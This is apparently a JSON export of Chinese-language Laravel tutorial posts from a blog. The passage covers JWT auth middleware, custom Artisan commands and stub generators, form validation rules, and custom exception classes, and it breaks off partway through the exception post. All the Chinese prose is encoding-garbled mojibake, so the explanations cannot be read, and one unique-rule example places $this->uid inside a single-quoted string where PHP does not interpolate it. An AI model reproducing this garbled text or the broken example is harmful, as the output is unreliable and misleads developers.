çš„è¿‡æœŸæ—¶é—´æ˜¯å‡ºäºç”¨æˆ·ä½“éªŒè€ƒè™‘ å‡ºäºå®‰å…¨æ€§è€ƒè™‘ï¼Œä¸ä¼šç»™ç”¨æˆ·ä¸‹å‘æ°¸ä¹…æœ‰æ•ˆçš„tokenï¼Œç”¨æˆ·éœ€è¦æ¯éš”ä¸€æ®µæ—¶é—´æ¥ç”¨è¿‡æœŸçš„token æ¥è·ŸæœåŠ¡å™¨æ¢å–ä¸€ä¸ªæ–°çš„ tokenã€‚ æ‰“ä¸ªæ¯”æ–¹ï¼š ä½ åœ¨é£Ÿå ‚åŠç†äº†ä¸€å¼ é¥­å¡ï¼Œæœ‰æ•ˆæœŸæ˜¯1ä¸ªæœˆï¼Œæ¯ä¸ªæœˆåˆéƒ½è¦å»é£Ÿå ‚æ¿€æ´»ä¸€æ¬¡ï¼Œä»¥æ•´æ˜ä½ è¿˜åœ¨å­¦æ ¡å¿µä¹¦ã€‚å¦‚æœè¶…è¿‡3ä¸ªæœˆå†…éƒ½æ²¡æœ‰æ¿€æ´»è¿™å¼ é¥­å¡ï¼Œåˆ™è§†ä¸ºè¯¥åå­¦ç”Ÿå·²ç»ä¸åœ¨å­¦æ ¡ï¼Œå¦‚æœ3ä¸ªæœˆåè¿™åå­¦ç”Ÿå›æ¥é£Ÿå ‚åƒé¥­ï¼Œéœ€è¦é‡æ–°åŠç†é¥­å¡ åŒæ ·çš„é“ç†è½¬æ¢åˆ°tokenï¼Œåªæ˜¯è¿™ä¸ªæ¿€æ´»æ­¥éª¤ä¸éœ€è¦ç”¨æˆ·çœŸçš„å»æ“ä½œï¼Œè¿™ä¸ªæ˜¯æˆ‘ä»¬æ¥åšçš„ï¼Œå…¨ç¨‹ç”¨æˆ·éƒ½æ˜¯æ— æ„Ÿçš„ï¼ˆè¿™ä¸ªæ˜¯åé¢çš„æ— ç—›åˆ·æ–° token çš„å†…å®¹ï¼‰ã€‚ ä½¿ç”¨è¯¦è§£Token æ‹¿åˆ°ä¹‹åï¼Œå¦‚ä½•åº”ç”¨åˆ°é¡¹ç›®ä¸­å‘¢ï¼Ÿ éœ€è¦é…åˆ auth:api ä¸­é—´ä»¶ä½¿ç”¨ï¼Œä½ è‚¯å®šä¼šè§‰å¾—å¥‡æ€ªï¼Œè¿™ä¸ªä¸­é—´ä»¶å¥½åƒæ²¡æœ‰åœ¨ä»»ä½•åœ°æ–¹å®šä¹‰ï¼Œæ€ä¹ˆå°±èƒ½ä½¿ç”¨ï¼Ÿ æ‰“å¼€app\\Http\\Kernel.phpï¼Œå¯ä»¥çœ‹åˆ°é»˜è®¤çš„è·¯ç”±ä¸­é—´ä»¶åˆ—è¡¨ï¼š 12345678910protected $routeMiddleware = [ 'auth' =&gt; \\Illuminate\\Auth\\Middleware\\Authenticate::class, 'auth.basic' =&gt; \\Illuminate\\Auth\\Middleware\\AuthenticateWithBasicAuth::class, 'bindings' =&gt; \\Illuminate\\Routing\\Middleware\\SubstituteBindings::class, 'cache.headers' =&gt; \\Illuminate\\Http\\Middleware\\SetCacheHeaders::class, 'can' =&gt; \\Illuminate\\Auth\\Middleware\\Authorize::class, 'guest' =&gt; \\App\\Http\\Middleware\\RedirectIfAuthenticated::class, 'signed' =&gt; \\Illuminate\\Routing\\Middleware\\ValidateSignature::class, 'throttle' =&gt; \\Illuminate\\Routing\\Middleware\\ThrottleRequests::class,]; å¯ä»¥å‘ç° auth å°±æ˜¯ç¬¬ä¸€ä¸ªä¸­é—´ä»¶çš„åˆ«åï¼Œä½†æ˜¯ auth:api åˆæ˜¯å“ªé‡Œæ¥çš„å‘¢ï¼Ÿ api æ˜¯ auth çš„è·¯ç”±å‚æ•°ï¼ŒæŒ‡å®šäº†è¦ä½¿ç”¨å“ªä¸ªçœ‹å®ˆå™¨ï¼Œè¿™é‡ŒæŒ‡å®šä½¿ç”¨ api çœ‹å®ˆå™¨ï¼Œä¹Ÿå°±æ˜¯ auth.php ä¸­é…ç½®çš„ api å®ˆå«ï¼š 123456'guards' =&gt; [ 'api' =&gt; [ 'driver' =&gt; 'jwt', 'provider' =&gt; 'user', ],], æ‰€ä»¥auth:api å¹¶ä¸æ˜¯å“ªé‡Œè‡ªå®šä¹‰çš„åˆ«åä¸­é—´ä»¶ã€‚ å¦‚æœç›´æ¥ä½¿ç”¨auth ä¸­é—´ä»¶ï¼Œç›¸å½“äºä½¿ç”¨ auth.php ä¸­æŒ‡å®šçš„ defaults çœ‹å®ˆå™¨ã€‚ 12345678910// è·¯ç”±ä¸­ä½¿ç”¨Route::middleware(\"auth.admin\")-&gt;group(function () &#123; // ...&#125;);// æ§åˆ¶å™¨ä¸­ä½¿ç”¨public function __construct()&#123; $this-&gt;middleware('auth:api', ['except' =&gt; ['login']]);&#125; å¸¸ç”¨æ–¹æ³•123456789101112131415161718192021222324252627// å°è¯•æ ¹æ®æä¾›çš„å‡­è¯éªŒè¯ç”¨æˆ·æ˜¯å¦åˆæ³•public function attempt(array $credentials = [], $remember = false);// ä¸€æ¬¡æ€§ç™»å½•ï¼Œä¸è®°å½•session or cookiepublic function once(array $credentials = []);// ç™»å½•ç”¨æˆ·ï¼Œé€šå¸¸åœ¨éªŒè¯æˆåŠŸåè®°å½• session å’Œ cookie public function login(Authenticatable $user, $remember = false);// ä½¿ç”¨ç”¨æˆ· id ç™»å½•public function loginUsingId($id, $remember = false);// ä½¿ç”¨ç”¨æˆ· ID ç™»å½•ï¼Œä½†æ˜¯ä¸è®°å½• session å’Œ cookiepublic function onceUsingId($id);// é€šè¿‡ cookie ä¸­çš„ remember token è‡ªåŠ¨ç™»å½•public function viaRemember();// ç™»å‡ºpublic function logout();// åˆ¤æ–­å½“å‰ç”¨æˆ·æ˜¯å¦ç™»å½•public function check();// åˆ¤æ–­å½“å‰ç”¨æˆ·æ˜¯å¦æ˜¯æ¸¸å®¢ï¼ˆæœªç™»å½•ï¼‰public function guest();// è·å–å½“å‰è®¤è¯çš„ç”¨æˆ·public function user();// è·å–å½“å‰è®¤è¯ç”¨æˆ·çš„ idï¼Œä¸¥æ ¼æ¥è¯´ä¸ä¸€å®šæ˜¯ idï¼Œåº”è¯¥æ˜¯ä¸Šä¸ªæ¨¡å‹ä¸­å®šä¹‰çš„å”¯ä¸€çš„å­—æ®µåpublic function id();// æ ¹æ®æä¾›çš„æ¶ˆæ¯è®¤è¯ç”¨æˆ·public function validate(array $credentials = []);// è®¾ç½®å½“å‰ç”¨æˆ·public function setUser(Authenticatable $user); å‚è€ƒé“¾æ¥ JWT å®Œæ•´ä½¿ç”¨è¯¦è§£ JWT æ‰©å±•å…·ä½“å®ç°è¯¦è§£ jwt-auth Quick start","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Laravel Artisan è‡ªå®šä¹‰å‘½ä»¤","slug":"laravel-artisan-custom-commands","date":"2021-06-05T01:39:06.000Z","updated":"2021-06-05T01:39:59.037Z","comments":true,"path":"laravel-artisan-custom-commands/","link":"","permalink":"https://www.0x2beace.com/laravel-artisan-custom-commands/","excerpt":"Laravel ä¸»è¦æä¾›äº†ä¸‰ç§å®ç°å‘½ä»¤è¡Œäº¤äº’çš„å·¥å…·ï¼š Artisanï¼šå†…ç½®ä¸€å¥—å‘½ä»¤è¡Œæ“ä½œï¼Œå¹¶å¯ä»¥è‡ªå®šä¹‰è¿›è¡Œæ‰©å±• Tinkerï¼šä¸ºåº”ç”¨æä¾›äº† REPL æˆ–è€…äº¤äº’çš„ shell å®‰è£…å™¨ï¼šé€šå¸¸åœ¨é¡¹ç›®åˆå§‹åŒ–æ—¶ç”¨åˆ° æœ¬ç« çš„å†…å®¹ä¸»è¦ä»¥ Artisan å‘½ä»¤ä¸ºä¸»ã€‚","text":"Laravel ä¸»è¦æä¾›äº†ä¸‰ç§å®ç°å‘½ä»¤è¡Œäº¤äº’çš„å·¥å…·ï¼š Artisanï¼šå†…ç½®ä¸€å¥—å‘½ä»¤è¡Œæ“ä½œï¼Œå¹¶å¯ä»¥è‡ªå®šä¹‰è¿›è¡Œæ‰©å±• Tinkerï¼šä¸ºåº”ç”¨æä¾›äº† REPL æˆ–è€…äº¤äº’çš„ shell å®‰è£…å™¨ï¼šé€šå¸¸åœ¨é¡¹ç›®åˆå§‹åŒ–æ—¶ç”¨åˆ° æœ¬ç« çš„å†…å®¹ä¸»è¦ä»¥ Artisan å‘½ä»¤ä¸ºä¸»ã€‚ Artisan åŸºæœ¬å‘½ä»¤ help å¸®åŠ©å‘½ä»¤ï¼Œä¾‹å¦‚ php artisan help commandName clear-compiled åˆ é™¤ Laravel çš„ç¼–è¯‘æ–‡ä»¶ï¼ˆå°±åƒä¸€ä¸ªå†…éƒ¨ç¼“å­˜ï¼‰ï¼Œå½“é‡åˆ°ä¸€äº›å¥‡æ€ªçš„é—®é¢˜æ—¶ï¼Œå¯ä»¥å…ˆå°è¯•è¿è¡Œè¿™ä¸ªå‘½ä»¤ down æŠŠåº”ç”¨åˆ‡æ¢åˆ°ã€ç»´æŠ¤æ¨¡å¼ã€ä»¥è§£å†³é”™è¯¯ã€è¿ç§»æˆ–è€…å…¶ä»–è¿è¡Œæ–¹å¼ã€‚up å¯ä»¥åœ¨ã€ç»´æŠ¤æ¨¡å¼ã€é‡Œæ¢å¤åº”ç”¨ env æ˜¾ç¤ºå½“æ—¶Laravel çš„è¿è¡Œç¯å¢ƒï¼Œå®ƒç­‰æ•ˆäºåœ¨åº”ç”¨ä¸­è¾“å…¥ app()-&gt;environment() migrate è¿ç§»æ•°æ®åº“ optimize é€šè¿‡æŠŠé‡è¦çš„PHP ç±»ç¼“å­˜åˆ° bootstrap/cache/compile.php æ¥ä¼˜åŒ–åº”ç”¨ serve éƒ¨ç½²ä¸€ä¸ªPHP æœåŠ¡å™¨åˆ° localhost:8000ï¼ˆå¯ä»¥é€šè¿‡ â€“host å’Œ -port è‡ªå®šä¹‰ä¿®æ”¹ä¸»æœºåå’Œç«¯å£å·ï¼‰ tinker æ‰“å¼€Tinker çš„REPL ç»„åˆå‘½ä»¤Laravel å†…ç½®äº†è®¸å¤šå¥½ç”¨çš„ç»„åˆå‘½ä»¤ã€‚ configä¸ºäº†æ›´å¿«åœ°æŸ¥é˜…ï¼Œconfig:cache ä¼šç¼“å­˜æ‰€æœ‰çš„é…ç½®ï¼Œconfig:clear ä¼šæ¸…ç†ç¼“å­˜ã€‚ dbå¦‚æœå·²ç»é…ç½®äº†æ•°æ®åº“çš„ seederï¼Œä¾¿å¯ä»¥ç”¨ db:seed å‘½ä»¤ï¼Œæ¥å¡«å……æ•°æ®åº“ã€‚ keykey:generate ä¼šåœ¨ .env æ–‡ä»¶ä¸­åˆ›å»ºä¸€ä¸ªéšæœºçš„åº”ç”¨åŠ å¯†å¯†é’¥ï¼Œç”¨äºå¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ã€‚ æ³¨æ„ï¼šè¿™ä¸ªå‘½ä»¤åªéœ€è¦è¿è¡Œä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯åˆå§‹ç¯å¢ƒæ—¶ï¼Œå¦‚æœå†æ¬¡è¿è¡Œï¼Œåˆ™ä¼šä¸¢å¤±åŸæœ‰çš„å¯†é’¥ã€‚ make make:commandï¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ Artisan å‘½ä»¤ make:controllerï¼šç”Ÿæˆ Controller make:requestï¼šç”Ÿæˆ Request make:resourceï¼šç”Ÿæˆ Resource make:exceptionï¼šç”Ÿæˆ Exception make:jobï¼šåˆ›å»ºå»¶è¿Ÿä»»åŠ¡ queue queue:listenï¼šå¼€å§‹ç›‘å¬ä¸€ä¸ªé˜Ÿåˆ— queue:tableï¼šä¸ºæ•°æ®åº“æ”¯æŒé˜Ÿåˆ—åˆ›å»ºä¸€ä¸ªè¿ç§» queque:flushï¼šåˆ·æ–°æ‰€æœ‰å¤±è´¥çš„é˜Ÿåˆ—ä»»åŠ¡ route route:listï¼šæŸ¥çœ‹åº”ç”¨çš„æ¯ä¸€ä¸ªè·¯ç”±å®šä¹‰ï¼ŒåŒ…æ‹¬æ¯ä¸ªè·¯ç”±å™¨çš„æ–¹æ³•ã€è·¯å¾„ã€åå­—ã€æ§åˆ¶å™¨/é—­åŒ…åŠ¨ä½œå’Œä¸­é—´ä»¶ã€‚ route:cacheï¼šç¼“å­˜è·¯ç”±å™¨çš„å®šä¹‰ï¼Œä»¥ä¾¿æ›´å¿«åœ°æŸ¥é˜… route:clearï¼šæ¸…ç†æ§åˆ¶å™¨ è‡ªå®šä¹‰Artisan å‘½ä»¤å…ˆæ¥åˆ›å»ºä¸€ä¸ªæ–°çš„å‘½ä»¤ï¼š 1php artisan make:command yourCommand å…ˆæ¥çœ‹ä¸€ä¸‹Artisan å‘½ä»¤çš„é»˜è®¤æ¶æ„ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpnamespace App\\Console\\Commands;use Illuminate\\Console\\Command;class yourCommand extends Command&#123; /** * æ§åˆ¶å°å‘½ä»¤åç§°å’Œç­¾å * * @var string */ protected $signature = 'command:name'; /** * æ§åˆ¶å°å‘½ä»¤æè¿° * * @var string */ protected $description = 'Command description'; /** * åˆ›å»ºä¸€ä¸ªæ–°çš„å‘½ä»¤å®ä¾‹ * * @return void */ public function __construct() &#123; parent::__construct(); &#125; /** * æ‰§è¡Œæ§åˆ¶å°å‘½ä»¤ * * @return int */ public function handle() &#123; return 0; &#125;&#125; $signatureï¼šç”¨äºå®šä¹‰å‘½ä»¤ç­¾åï¼Œæ¯”å¦‚ç­¾åæ˜¯ command:nameï¼Œé‚£ä¹ˆæœ€ç»ˆæ‰§è¡Œçš„å‘½ä»¤åº”è¯¥æ˜¯ï¼šphp artisan command:name $descriptionï¼šå¯¹äºè¯¥å‘½ä»¤çš„æè¿° handle()ï¼šæ‰§è¡Œå‘½ä»¤æ‰€éœ€è¦åšçš„äº‹æƒ… åœ¨ handle() ä¸­æ£€ç´¢å‘½ä»¤è¡Œå‚æ•°å’Œé€‰é¡¹å€¼ï¼š argument()ï¼šè¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å‚æ•°çš„æ•°ç»„ option()ï¼šè¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰é€‰é¡¹çš„æ•°ç»„ åœ¨ handle() ä¸­è·å–ç”¨æˆ·è¾“å…¥ï¼š ask()ï¼šæç¤ºç”¨æˆ·è¾“å…¥æ–‡æœ¬ secret()ï¼šæç¤ºç”¨æˆ·è¾“å…¥æ–‡æœ¬ï¼Œä½†æ˜¯ä¼šç”¨æ˜Ÿå·æ¥éšè—è¾“å…¥å†…å®¹ confirm()ï¼šæç¤ºç”¨æˆ·æ¢å¤ æ˜¯/å¦ï¼Œè¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ choice()ï¼šæç¤ºç”¨æˆ·é€‰æ‹©ä¸€ä¸ªé€‰é¡¹ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰é€‰æ‹©ï¼Œé‚£ä¹ˆæœ€åä¸€ä¸ªå‚æ•°å°±ä¼šä½¿ç”¨é»˜è®¤å€¼ Code generatorLaravel é»˜è®¤ä¸ºæˆ‘ä»¬æä¾›äº†ï¼Œmake:controller è¿™æ ·çš„ç”Ÿæˆæ§åˆ¶å™¨çš„å‘½ä»¤ï¼Œé‚£å¦‚æœéœ€è¦ç”Ÿæˆè‡ªå®šä¹‰çš„ä»£ç ï¼Œåˆè¯¥å¦‚ä½•åšå‘¢ï¼Ÿ è¿™é‡Œä»¥ Service ä¸ºä¾‹ï¼Œé¦–å…ˆåˆ›å»ºå‘½ä»¤ï¼š 1php artisan make:command MakeService ç¼–è¾‘app/Console/Command/MakeService.phpï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?phpnamespace App\\Console\\Commands;use Illuminate\\Console\\GeneratorCommand;/** * Generator Service * * Class MakeService * * @package App\\Console\\Commands */class MakeService extends GeneratorCommand&#123; /** * The name and signature of the console command. * * @var string */ protected $name = 'make:service'; /** * The console command description. * * @var string */ protected $description = 'Create a new custom service class'; /** * The type of class being generated. * * @var string */ protected $type = 'Service'; /** * Get the stub file for the generator. * * @return string */ protected function getStub() &#123; return __DIR__ . '/stubs/service.stub'; &#125; /** * Get the default namespace for the class. * * @param string $rootNamespace * @return string */ protected function getDefaultNamespace($rootNamespace) &#123; return $rootNamespace . '\\Services'; &#125;&#125; é€šè¿‡å®ç° GeneratorCommand æŠ½è±¡ç±»æ¥ç”Ÿæˆä»£ç ï¼ŒåŒæ—¶éœ€è¦åœ¨ MakeService.php åŒçº§ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª stubs/service.stub æ–‡ä»¶ï¼Œå¹¶å¡«å…¥ç›¸åº”çš„æ¨¡æ¿æ–‡ä»¶ï¼š 12345678910111213&lt;?phpnamespace &#123;&#123; namespace &#125;&#125;;class &#123;&#123; class &#125;&#125;&#123; protected $model; public function __construct() &#123; &#x2F;&#x2F; $this-&gt;$model &#x3D; $model; &#125;&#125; æœ€çº¢ä½¿ç”¨ php artisan make:service TestService å‘½ä»¤ï¼Œå°±å¯ä»¥ç”ŸæˆService äº†ï½","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Laravel Request å¸¸è§è¡¨å•éªŒè¯æ•´ç†","slug":"laravel-request-common-form-validation-finishing","date":"2021-05-24T13:11:08.000Z","updated":"2021-05-24T13:32:15.940Z","comments":true,"path":"laravel-request-common-form-validation-finishing/","link":"","permalink":"https://www.0x2beace.com/laravel-request-common-form-validation-finishing/","excerpt":"Laravel çš„è¡¨å•éªŒè¯éå¸¸å¼ºå¤§ï¼Œç»“åˆå•ä¸€èŒè´£åŸåˆ™ï¼Œåœ¨Request ç±»ä¸­å°±èƒ½æ»¡è¶³æ—¥å¸¸å¼€å‘ç»å¤§å¤šæ•°éªŒè¯åœºæ™¯ã€‚","text":"Laravel çš„è¡¨å•éªŒè¯éå¸¸å¼ºå¤§ï¼Œç»“åˆå•ä¸€èŒè´£åŸåˆ™ï¼Œåœ¨Request ç±»ä¸­å°±èƒ½æ»¡è¶³æ—¥å¸¸å¼€å‘ç»å¤§å¤šæ•°éªŒè¯åœºæ™¯ã€‚ ä¸‹é¢æ•´ç†äº†å¸¸ç”¨çš„ä¸€äº›è¡¨å•éªŒè¯è§„åˆ™ï¼Œå¤§è‡´å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼š å¸¸è§„éªŒè¯ è‡ªå®šä¹‰è§„åˆ™éªŒè¯ æ•°æ®åº“éªŒè¯ å¸¸è§„éªŒè¯æ‰€è°“çš„å¸¸è§„éªŒè¯å°±æ˜¯ç›´æ¥ä½¿ç”¨Laravel è¡¨å•éªŒè¯ä¸ºæˆ‘ä»¬æä¾›çš„éªŒè¯è§„åˆ™ã€‚ booleanéªŒè¯çš„å­—æ®µå¿…é¡»å¯ä»¥è½¬æ¢ä¸º Boolean ç±»å‹ã€‚ å¯æ¥å—çš„è¾“å…¥ä¸º true ï¼Œ false ï¼Œ 1 ï¼Œ0 ï¼Œ &quot;1&quot; å’Œ &quot;0&quot; ã€‚ alphaå¾…éªŒè¯å­—æ®µåªèƒ½ç”±å­—æ¯ç»„æˆã€‚ alpha_numå¾…éªŒè¯å­—æ®µåªèƒ½ç”±å­—æ¯å’Œæ•°å­—ç»„æˆã€‚ arrayå¾…éªŒè¯å­—æ®µå¿…é¡»æ˜¯æœ‰æ•ˆçš„ PHP æ•°ç»„ã€‚ urléªŒè¯çš„å­—æ®µå¿…é¡»æ˜¯æœ‰æ•ˆçš„ URLã€‚ integeréªŒè¯çš„å­—æ®µå¿…é¡»æ˜¯æ•´æ•°ã€‚ numericéªŒè¯å­—æ®µå¿…é¡»ä¸ºæ•°å€¼ã€‚ æ³¨æ„æ•°å€¼å’Œæ•´æ•°çš„åŒºåˆ«ã€‚ jsonéªŒè¯çš„å­—æ®µå¿…é¡»æ˜¯æœ‰æ•ˆçš„ JSON å­—ç¬¦ä¸²ã€‚ max/minéªŒè¯å­—æ®µå¿…é¡»åœ¨æœ€å°å€¼ä¸æœ€å¤§å€¼ä¹‹é—´ã€‚ 123return [ \"value\" =&gt; \"max:99|min:1\" ]; inéªŒè¯å­—æ®µå¿…é¡»åŒ…å«åœ¨ç»™å®šçš„å€¼åˆ—è¡¨ä¸­ï¼š 123return [ \"value\" =&gt; \"in:0,1,2,3\" ]; digits_betweenéªŒè¯ä¸­çš„å­—æ®µå¿…é¡»ä¸º numericï¼Œå¹¶ä¸”é•¿åº¦å¿…é¡»åœ¨ç»™å®šçš„ min å’Œ max ä¹‹é—´ã€‚ 123return [ \"mobile\" =&gt; \"digits_between:8,11\" ]; dimensionséªŒè¯çš„æ–‡ä»¶å¿…é¡»æ˜¯å›¾ç‰‡å¹¶ä¸”å›¾ç‰‡æ¯”ä¾‹å¿…é¡»ç¬¦åˆè§„åˆ™: 123return [ 'avatar' =&gt; 'dimensions:min_width=100,min_height=200']; å¯¹äºå›¾ç‰‡çš„éªŒè¯ï¼Œä½¿ç”¨ dimensions å°¤å…¶æœ‰ç”¨ã€‚ imageéªŒè¯çš„æ–‡ä»¶å¿…é¡»æ˜¯å›¾ç‰‡ (jpeg, png, bmp, gif, svg, or webp)ã€‚ requiredéªŒè¯çš„å­—æ®µå¿…é¡»å­˜åœ¨äºè¾“å…¥æ•°æ®ä¸­ï¼Œè€Œä¸æ˜¯ç©ºã€‚å¦‚æœæ»¡è¶³ä»¥ä¸‹æ¡ä»¶ä¹‹ä¸€ï¼Œåˆ™å­—æ®µè¢«è§†ä¸ºã€Œç©ºã€ï¼š å€¼ä¸º nullã€‚ å€¼ä¸ºç©ºå­—ç¬¦ä¸²ã€‚ å€¼ä¸ºç©ºæ•°ç»„æˆ–ç©º Countable å¯¹è±¡ã€‚ å€¼ä¸ºæ— è·¯å¾„çš„ä¸Šä¼ æ–‡ä»¶ã€‚ filledéªŒè¯çš„å­—æ®µåœ¨å­˜åœ¨æ—¶ä¸èƒ½ä¸ºç©ºã€‚ exclude_ifå¯ä»¥æŒ‡å®šå½“éªŒè¯å­—æ®µçš„å€¼ä¸º value æ—¶ï¼Œå…¶ä»–éªŒè¯è§„åˆ™å¯ä»¥æ’é™¤ã€‚ 123return [ \"id\" =&gt; \"required|exclude_if:id,0|integer|exists:admin,id\",]; å½“ id ä¸ºé›¶æ—¶ï¼Œä¸ä¼šéªŒè¯exists è§„åˆ™ã€‚ è‡ªå®šä¹‰è§„åˆ™éªŒè¯å¦‚æœæŸä¸ªè§„åˆ™ä»…ä»…åªä½¿ç”¨ä¸€æ¬¡ï¼Œé‚£ä¹ˆä½¿ç”¨é—­åŒ…æ¥åˆ›å»ºè‡ªå®šä¹‰è§„åˆ™å†é€‚åˆä¸è¿‡ï¼Œé—­åŒ…å‡½æ•°æ¥æ”¶å±æ€§çš„æ–¹æ³•ï¼Œå±æ€§çš„å€¼ä»¥åŠåœ¨æ ¡éªŒå¤±è´¥æ—¶çš„å›è°ƒå‡½æ•° $failï¼š 1234567return [ \"age\" =&gt; function ($attribute, $value, $fail) &#123; if ($value &gt; 18) &#123; return $fail(\"å¹´é¾„ä¸ç¬¦\"); &#125; &#125;;]; æ•°æ®åº“éªŒè¯existséªŒè¯çš„å­—æ®µå¿…é¡»å­˜åœ¨äºç»™å®šçš„æ•°æ®åº“è¡¨ä¸­ã€‚ 123return [ 'email' =&gt; 'exists:users,email_address']; uniqueéªŒè¯å­—æ®µåœ¨ç»™å®šçš„æ•°æ®åº“è¡¨ä¸­å¿…é¡»æ˜¯å”¯ä¸€çš„ã€‚ è¯­æ³•ï¼šunique:table,column,except,idColumnã€‚ åŸºæœ¬ç”¨æ³•ï¼ŒæŒ‡å®šè‡ªå®šä¹‰çš„åˆ—è¡¨ï¼š 123return [ 'email' =&gt; 'unique:users,email_address']; åœ¨åšupdate æ“ä½œæ—¶ï¼Œå¦‚æœæäº¤äº† emailï¼Œé‚£ä¹ˆä¸Šé¢çš„é‚£ä¸ªéªŒè¯ä»ç„¶ä¼šç”Ÿæ•ˆï¼Œè¿™æ—¶å¯ä»¥é€šè¿‡å®šä¹‰ except å½“å‰ç”¨æˆ·ã€‚ 123return [ 'email' =&gt; 'unique:users,email_address,$this-&gt;uid,uid']; ç”Ÿæˆçš„SQLï¼š 1select count(*) as aggregate from users where email_address = \"geeek001@qq.com\" and uid &lt;&gt; 1; åŒæ ·å¯ä»¥ä½¿ç”¨Rule åŠ©æ‰‹å‡½æ•°æ¥å®Œæˆæ•°æ®åº“éªŒè¯ï¼š 12345return [ \"email\" =&gt; [ Rule::unique(\"users\", \"email_address\"), ], ]; å‚è€ƒé“¾æ¥ Laravel è¡¨å•éªŒè¯","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Laravel Exception åŸºæœ¬ä½¿ç”¨","slug":"basic-use-of-laravel-cxception","date":"2021-05-22T12:46:20.000Z","updated":"2021-05-24T13:12:05.466Z","comments":true,"path":"basic-use-of-laravel-cxception/","link":"","permalink":"https://www.0x2beace.com/basic-use-of-laravel-cxception/","excerpt":"åœ¨Laravel ä¸­ï¼Œæ‰€æœ‰å¼‚å¸¸éƒ½æ˜¯ç”± App\\Exceptions\\Handler ç±»å¤„ç†ï¼ŒåŒæ—¶ä¹Ÿä¼šè®°å½•åœ¨æ—¥å¿—ä¿¡æ¯ä¸­ã€‚","text":"åœ¨Laravel ä¸­ï¼Œæ‰€æœ‰å¼‚å¸¸éƒ½æ˜¯ç”± App\\Exceptions\\Handler ç±»å¤„ç†ï¼ŒåŒæ—¶ä¹Ÿä¼šè®°å½•åœ¨æ—¥å¿—ä¿¡æ¯ä¸­ã€‚ é€šå¸¸å¯èƒ½ä¼šç›´æ¥ä½¿ç”¨ throw new \\Exception æ¥æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ç»ˆæ­¢æµç¨‹ï¼Œä½†æ˜¯ç”±äºç³»ç»Ÿå¯èƒ½ä¼šæœ‰å„å¼å„æ ·çš„å¼‚å¸¸ï¼Œä¸šåŠ¡ä»£ç å¤„å¤„æŠ›å‡º \\Exception å’Œæ•è· \\Exceptionï¼Œå¯¼è‡´å¦‚æœé‡åˆ°ç³»ç»Ÿé”™è¯¯ï¼Œæ— æ³•åŠæ—¶é€šçŸ¥ã€‚ å¼‚å¸¸å¯ä»¥å¤§è‡´åˆ†ä¸ºä¸¤ç±»ï¼š ç”¨æˆ·å¼‚å¸¸ å’Œ ç³»ç»Ÿå¼‚å¸¸ã€‚ ç”¨æˆ·é”™è¯¯è¡Œä¸ºè§¦å‘çš„å¼‚å¸¸æ¯”å¦‚è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„èµ„æºï¼Œå¯¹äºæ­¤ç±»å¼‚å¸¸æˆ‘ä»¬éœ€è¦æŠŠè§¦å‘å¼‚å¸¸çš„åŸå› å‘ŠçŸ¥ç”¨æˆ·ã€‚ å¯ä»¥æŠŠè¿™ç±»å¼‚å¸¸å‘½åä¸º InvalidRequestExceptionï¼Œåœ¨Laravel ä¸­ï¼Œå¯ä»¥é€šè¿‡ make:exception å‘½ä»¤æ¥åˆ›å»ºå¼‚å¸¸ï¼š 1php artisan make:exception InvalidRequestException app/Exceptions/InvalidRequestException.phpï¼š 1234567891011121314151617181920212223&lt;?phpnamespace App\\Exceptions;use Exception;use Illuminate\\Http\\Request;class InvalidRequestException extends Exception&#123; public function __construct(string $message = \"\", int $code = 400) &#123; parent::__construct($message, $code); &#125; public function render(Request $request) &#123; if ($request-&gt;expectsJson()) &#123; return response()-&gt;json(['msg' =&gt; $this-&gt;message], $this-&gt;code); &#125; return view('pages.error', ['msg' =&gt; $this-&gt;message]); &#125;&#125; æ³¨æ„è¿™é‡Œé‡å†™äº†Illuminate\\Foundation\\Exceptions\\Handler çˆ¶ç±»çš„render() æ–¹æ³•ï¼Œå¼‚å¸¸è¢«è§¦å‘æ—¶ç³»ç»Ÿä¼šè°ƒç”¨ render() æ–¹æ³•æ¥è¾“å‡ºï¼Œå¯ä»¥åœ¨render() é‡Œåˆ¤æ–­å¦‚æœæ˜¯ AJAX è¯·æ±‚åˆ™è¿”å› JSON æ ¼å¼çš„æ•°æ®ï¼Œå¦åˆ™å°±è¿”å›ä¸€ä¸ªé”™è¯¯é¡µé¢ã€‚ å½“å¼‚å¸¸è§¦å‘æ—¶ Laravel é»˜è®¤ä¼šæŠŠå¼‚å¸¸çš„ä¿¡æ¯å’Œè°ƒç”¨æ ˆæ‰“å°åˆ°æ—¥å¿—ï¼ˆstorage/logs/laravel.logï¼‰é‡Œï¼Œæ¯”å¦‚ï¼š 